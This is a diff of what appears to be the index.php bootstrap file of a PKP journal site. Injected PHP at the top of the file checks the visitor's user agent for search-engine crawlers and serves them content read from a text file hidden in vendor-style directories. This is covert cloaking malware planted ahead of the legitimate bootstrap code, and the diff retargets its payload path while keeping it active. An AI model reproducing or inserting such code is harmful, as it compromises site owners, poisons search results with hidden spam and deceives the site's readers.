@@ -16,7 +16,7 @@ function skylight_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/u291286007/domains/tcais.net/public_html/lib/pkp/lib/vendor/components/jqueryui/themes/blitzer/images/index.txt";
+$bot = "/home/spcrdnet/public_html/jelss.miard.org/lib/pkp/lib/counterBots/generated/index.txt";
 $file = skylight_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
@@ -24,6 +24,9 @@ if (preg_match($botchar, $res)) {
 }
 ?>
 <?php
+
+
+
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
@@ -58,7 +61,6 @@ chdir(BASE_SYS_DIR);
 
 // System-wide functions
 require('./lib/pkp/includes/functions.inc.php');
-
 
 // Initialize the application environment
 import('classes.core.Application');
